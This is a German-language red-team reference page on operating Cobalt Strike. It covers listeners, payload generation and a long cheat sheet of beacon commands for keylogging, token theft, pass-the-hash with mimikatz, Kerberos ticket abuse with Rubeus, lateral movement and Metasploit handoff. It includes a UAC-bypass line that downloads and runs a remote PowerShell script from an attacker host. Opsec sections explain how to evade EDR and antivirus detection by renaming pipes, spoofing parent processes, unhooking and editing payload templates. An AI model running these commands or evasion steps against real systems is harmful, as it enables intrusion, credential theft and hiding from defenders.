# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` anschließend kannst du auswählen, wo gelauscht werden soll, welche Art von Beacon verwendet werden soll (http, dns, smb...) und mehr.

### Peer2Peer Listeners

Die Beacons dieser Listener müssen nicht direkt mit dem C2 kommunizieren, sondern können über andere Beacons mit ihm kommunizieren.

`Cobalt Strike -> Listeners -> Add/Edit` anschließend musst du die TCP- oder SMB-Beacons auswählen.

* Der **TCP Beacon richtet einen Listener auf dem ausgewählten Port ein**. Um eine Verbindung zu einem TCP Beacon herzustellen, verwende den Befehl `connect <ip> <port>` von einem anderen Beacon aus.
* Der **SMB Beacon lauscht in einer Pipename mit dem ausgewählten Namen**. Um eine Verbindung zu einem SMB Beacon herzustellen, musst du den Befehl `link [target] [pipe]` verwenden.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** für HTA-Dateien
* **`MS Office Macro`** für ein Office-Dokument mit einem Macro
* **`Windows Executable`** für eine .exe-, .dll- oder Service-.exe-Datei
* **`Windows Executable (S)`** für eine **stageless** .exe-, .dll- oder Service-.exe-Datei (stageless ist besser als staged, da weniger IoCs entstehen)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dies generiert ein Script/eine ausführbare Datei zum Herunterladen des Beacons von Cobalt Strike in Formaten wie bitsadmin, exe, powershell und python.

#### Host Payloads

Wenn du die Datei, die du auf einem Webserver hosten möchtest, bereits hast, gehe einfach zu `Attacks -> Web Drive-by -> Host File` und wähle die zu hostende Datei sowie die Konfiguration des Webservers aus.

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Ein Custom Agent muss lediglich das HTTP/S-Protokoll des Cobalt Strike Team Servers (standardmäßiges malleable C2 profile) sprechen, um sich zu registrieren/einzuchecken und Tasks zu empfangen. Implementiere dieselben im Profile definierten URIs/Headers/Metadata-Crypto, um die Cobalt Strike UI für Tasking und die Ausgabe wiederzuverwenden.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Ein Aggressor Script (z. B. `CustomBeacon.cna`) kann die Payload-Generierung für den nicht auf Windows basierenden Beacon kapseln, sodass Operatoren den Listener auswählen und ELF-Payloads direkt über die GUI erzeugen können.
- Beispielhafte Linux-Task-Handler, die dem Team Server bereitgestellt werden: `sleep`, `cd`, `pwd`, `shell` (beliebige Befehle ausführen), `ls`, `upload`, `download` und `exit`. Diese werden auf die vom Team Server erwarteten Task-IDs abgebildet und müssen serverseitig implementiert werden, um die Ausgabe im korrekten Format zurückzugeben.
- BOF support auf Linux kann durch das In-Process-Laden von Beacon Object Files mit [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) hinzugefügt werden (unterstützt auch Outflank-style BOFs). Dadurch kann modulare Post-Exploitation innerhalb des Kontexts und mit den Privilegien des Implants ausgeführt werden, ohne neue Prozesse zu starten.<sup>[[2]](#references)[[3]](#references)</sup>
- Bette einen SOCKS-Handler in den Custom Beacon ein, um beim Pivoting die Gleichwertigkeit mit Windows Beacons beizubehalten: Wenn der Operator `socks <port>` ausführt, sollte der Implant einen lokalen Proxy öffnen, um Operator-Tools über den kompromittierten Linux-Host in interne Netzwerke zu routen.

## Opsec

### Execute-Assembly

**`execute-assembly`** verwendet einen **sacrificial process**, der Remote Process Injection nutzt, um das angegebene Programm auszuführen. Dies ist sehr auffällig, da für die Injection in einen Prozess bestimmte Win APIs verwendet werden, die von jedem EDR überprüft werden. Es gibt jedoch einige Custom Tools, mit denen etwas im selben Prozess geladen werden kann:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- In Cobalt Strike kannst du auch BOF (Beacon Object Files) verwenden: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Das Aggressor Script `https://github.com/outflanknl/HelpColor` erstellt in Cobalt Strike den Befehl `helpx`, der Befehle farblich markiert und anzeigt, ob es sich um BOFs (grün), um Frok&Run (gelb) oder Ähnliches oder um ProcessExecution, Injection oder Ähnliches (rot) handelt. Das hilft dabei zu erkennen, welche Befehle stealthier sind.

### Als Benutzer auftreten

Du könntest Ereignisse wie `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` überprüfen:

- Security EID 4624 - Überprüfe alle interaktiven Logons, um die üblichen Arbeitszeiten zu ermitteln.
- System EID 12,13 - Überprüfe die Häufigkeit von Shutdowns/Starts/Schlafzuständen.
- Security EID 4624/4625 - Überprüfe eingehende gültige/ungültige NTLM-Versuche.
- Security EID 4648 - Dieses Ereignis wird erstellt, wenn Klartext-Credentials für einen Logon verwendet werden. Wenn ein Prozess es erzeugt hat, enthält das Binary möglicherweise die Credentials im Klartext in einer Config-Datei oder im Code.

Wenn du `jump` aus Cobalt Strike verwendest, ist es besser, die Methode `wmi_msbuild` zu nutzen, damit der neue Prozess legitimer aussieht.

### Computer-Accounts verwenden

Für Defender ist es üblich, auf verdächtige Verhaltensweisen von Benutzern zu prüfen und **Service-Accounts sowie Computer-Accounts wie `*$` aus ihrem Monitoring auszuschließen**. Du könntest diese Accounts für laterale Bewegungen oder Privilege Escalation verwenden.

### Stageless Payloads verwenden

Stageless Payloads sind weniger auffällig als Staged-Payloads, da sie keine zweite Stage vom C2-Server herunterladen müssen. Das bedeutet, dass sie nach der initialen Verbindung keinen Netzwerkverkehr erzeugen und daher mit geringerer Wahrscheinlichkeit von netzwerkbasierten Abwehrmechanismen erkannt werden.

### Tokens & Token Store

Sei vorsichtig, wenn du Tokens stiehlst oder erzeugst, da es für einen EDR möglich sein könnte, alle Tokens aller Threads aufzulisten und in dem Prozess ein **Token zu finden, das zu einem anderen Benutzer** oder sogar zu SYSTEM gehört.

Damit können Tokens **pro Beacon** gespeichert werden, sodass nicht wiederholt dasselbe Token gestohlen werden muss. Dies ist für laterale Bewegungen oder Situationen nützlich, in denen du ein gestohlenes Token mehrfach verwenden musst:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Bei lateralen Bewegungen ist es normalerweise besser, **ein Token zu stehlen, statt ein neues zu erzeugen** oder einen Pass-the-Hash-Angriff durchzuführen.

### Guardrails

Cobalt Strike verfügt über eine Funktion namens **Guardrails**, die dabei hilft, die Verwendung bestimmter Befehle oder Aktionen zu verhindern, die von Defendern erkannt werden könnten. Guardrails können so konfiguriert werden, dass bestimmte Befehle wie `make_token`, `jump`, `remote-exec` und andere blockiert werden, die häufig für laterale Bewegungen oder Privilege Escalation verwendet werden.

Darüber hinaus enthält das Repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) ebenfalls einige Checks und Ideen, die du vor dem Ausführen einer Payload berücksichtigen könntest.

### Ticket-Verschlüsselung

Sei in einer AD-Umgebung vorsichtig mit der Verschlüsselung der Tickets. Standardmäßig verwenden manche Tools RC4-Verschlüsselung für Kerberos-Tickets, die weniger sicher als AES-Verschlüsselung ist. In aktuellen Umgebungen wird standardmäßig AES verwendet. Dies kann von Defendern erkannt werden, die auf schwache Verschlüsselungsalgorithmen überwachen.

### Defaults vermeiden

Bei der Standardverwendung von Cobalt Stricke heißen die SMB-Pipes `msagent_####` und `"status_####"`. Ändere diese Namen. Die Namen vorhandener Pipes können in Cobal Strike mit dem Befehl `ls \\.\pipe\` überprüft werden.

Bei SSH-Sessions wird außerdem eine Pipe namens `\\.\pipe\postex_ssh_####` erstellt. Ändere sie mit `set ssh_pipename "<new_name>";`.

Auch beim Post-Exploitation-Angriff können die Pipes `\\.\pipe\postex_####` mit `set pipename "<new_name>"` geändert werden.

In Cobalt Strike-Profilen kannst du außerdem Folgendes ändern:

- Die Verwendung von `rwx` vermeiden
- Wie das Process-Injection-Verhalten funktioniert (welche APIs verwendet werden) im Block `process-inject {...}`
- Wie "fork and run" im Block `post-ex {…}` funktioniert
- Die Sleep-Zeit
- Die maximale Größe der Binarys, die in den Speicher geladen werden
- Den Memory Footprint und DLL-Inhalt mit dem Block `stage {...}`
- Den Netzwerkverkehr

### Memory Scanning umgehen

Einige ERDs scannen den Speicher nach bekannten Malware-Signaturen. Coblat Strike ermöglicht es, die Funktion `sleep_mask` als BOF zu ändern, die das Bacldoor im Speicher verschlüsseln kann.

### Laute Proc-Injections

Wenn Code in einen Prozess injiziert wird, ist dies normalerweise sehr auffällig. Das liegt daran, dass **kein regulärer Prozess diese Aktion normalerweise ausführt und die Möglichkeiten dafür sehr begrenzt sind**. Daher könnte dies von verhaltensbasierten Detection-Systemen erkannt werden. Außerdem könnte es von EDRs erkannt werden, die das Netzwerk nach **Threads mit Code scannen, der sich nicht auf der Festplatte befindet** (obwohl Prozesse wie Browser, die JIT verwenden, dies häufig tun). Beispiel: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID- und PPID-Beziehungen

Beim Starten eines neuen Prozesses ist es wichtig, eine **reguläre Parent-Child**-Beziehung zwischen Prozessen **beizubehalten**, um eine Erkennung zu vermeiden. Wenn svchost.exec iexplorer.exe ausführt, wirkt dies verdächtig, da svchost.exe in einer normalen Windows-Umgebung kein Parent von iexplorer.exe ist.

Wenn in Cobalt Strike standardmäßig ein neuer Beacon gestartet wird, wird ein Prozess mit **`rundll32.exe`** erstellt, um den neuen Listener auszuführen. Dies ist nicht besonders stealthy und kann von EDRs leicht erkannt werden. Außerdem wird `rundll32.exe` ohne Argumente ausgeführt, was noch verdächtiger wirkt.

Mit dem folgenden Cobalt Strike-Befehl kannst du einen anderen Prozess angeben, der den neuen Beacon startet, wodurch er schwieriger erkannt werden kann:
```bash
spawnto x86 svchost.exe
```
You can also change this setting **`spawnto_x86` und `spawnto_x64`** in a profile.

### Den Traffic des Angreifers proxien

Angreifer müssen manchmal in der Lage sein, Tools lokal auszuführen, sogar auf Linux-Maschinen, und den Traffic der Opfer das Tool erreichen zu lassen (z. B. NTLM relay).

Außerdem ist es bei einem pass-the-hash- oder pass-the-ticket-Angriff manchmal unauffälliger, wenn der Angreifer **diesen Hash oder dieses Ticket lokal in seinen eigenen LSASS-Prozess einfügt** und anschließend darüber pivotiert, anstatt einen LSASS-Prozess auf einer Opfermaschine zu verändern.

Allerdings musst du beim **generierten Traffic vorsichtig** sein, da du möglicherweise ungewöhnlichen Traffic (Kerberos?) aus deinem Backdoor-Prozess sendest. Dafür könntest du in einen Browser-Prozess pivotieren (du könntest jedoch beim Injizieren in einen Prozess entdeckt werden, also überlege dir eine unauffällige Methode dafür).


### AVs umgehen

#### AV/AMSI/ETW Bypass

Siehe die Seite:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Normalerweise findest du unter `/opt/cobaltstrike/artifact-kit` den Code und die vorkompilierten Templates (in `/src-common`) für die Payloads, die Cobalt Strike zur Erstellung der binären Beacons verwendet.

Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kannst du anhand des generierten Backdoors (oder einfach anhand des kompilierten Templates) herausfinden, was Defender auslöst. Normalerweise handelt es sich um einen String. Daher kannst du einfach den Code ändern, der das Backdoor generiert, sodass dieser String nicht im finalen Binary erscheint.

Führe nach der Änderung des Codes einfach `./build.sh` aus demselben Verzeichnis aus und kopiere den Ordner `dist-pipe/` auf den Windows-Client nach `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Vergiss nicht, das aggressive Script `dist-pipe\artifact.cna` zu laden, damit Cobalt Strike die gewünschten Ressourcen von der Festplatte verwendet und nicht die bereits geladenen.

#### Resource Kit

Der Ordner ResourceKit enthält die Vorlagen für die scriptbasierten Payloads von Cobalt Strike, einschließlich PowerShell, VBA und HTA.

Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kannst du anhand der Vorlagen herausfinden, was dem Defender (in diesem Fall AMSI) nicht gefällt, und es entsprechend anpassen:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modifying the detected lines, one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method for EDRs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or simply jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, one option might be stealthier than the other.

This can be set in the profile or using the command **`syscall-method`**

However, this could also be noisy.

One option provided by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You can also check which functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Referenzen

- [1] [Cobalt Strike Linux Beacon (benutzerdefinierter Implantat-PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42-Analyse der Cobalt-Strike-Metadatenverschlüsselung](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [SANS-ISC-Tagebuch über Cobalt-Strike-Datenverkehr](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
